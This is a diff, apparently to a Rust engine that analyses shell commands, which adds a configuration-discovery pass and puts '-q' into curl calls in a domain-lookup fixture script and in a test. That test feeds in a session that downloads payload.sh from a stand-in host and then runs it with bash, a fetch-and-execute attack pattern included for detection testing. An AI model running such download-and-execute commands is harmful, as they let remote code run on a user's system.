@@ -609,11 +609,14 @@ fn build_default_runner() -> Result<PassRunner, ShellQueryCoreInitError> {
     runner.register_request_transform_pass(ParseCommandPass);
     runner.register_session_transform_pass(ProjectTopLevelCommandsPass);
     runner.register_session_transform_pass(ExtractAliasBindingsPass);
-    runner.register_session_transform_pass(ResolveInvocationPass::new(registry));
+    runner.register_session_transform_pass(ResolveInvocationPass::new(registry.clone()));
     runner.register_session_transform_pass(ExtractFunctionBindingsPass);
     runner.register_session_transform_pass(ComputeEffectiveCwdPass);
     runner.register_session_transform_pass(ExtractCurrentWorkingDirectoryPass);
     runner.register_session_transform_pass(ExtractPipelineFlowPass);
+    runner.register_session_transform_pass(caushell_passes::DiscoverToolConfigInputsPass::new(
+        registry,
+    ));
     runner.register_session_transform_pass(ExtractExecutionSemanticsPass);
     runner.register_session_transform_pass(ExtractImportedPackageProvenancePass);
     runner.register_session_transform_pass(ExtractVariableBindingIntentPass);
@@ -5190,7 +5193,7 @@ echo ""
 # 查询种子域名
 for domain in bilibili.com biligame.com bilibiligame.net acg.tv huasheng.cn updream.cn; do
     echo "查询: $domain"
-    result=$(curl -s "http://localhost:16181/icp?search=$domain")
+    result=$(curl -q -s "http://localhost:16181/icp?search=$domain")
     echo "$result" | jq -r '.' 2>/dev/null || echo "$result"
     echo "$result" >> output/bilibili/pipeline_0/icp_query_results.json
     echo "" >> output/bilibili/pipeline_0/icp_query_results.json
@@ -5450,7 +5453,7 @@ cat output/bilibili/pipeline_0/icp_query_results.json | jq -r '.data[]? | .unitN
         let first = core.check(sample_request(
             "sess-remote",
             1,
-            "curl -o ./payload.sh https://example.test/payload.sh",
+            "curl -q -o ./payload.sh https://example.test/payload.sh",
         ));
         let second = core.check(sample_request("sess-remote", 2, "bash ./payload.sh"));
 
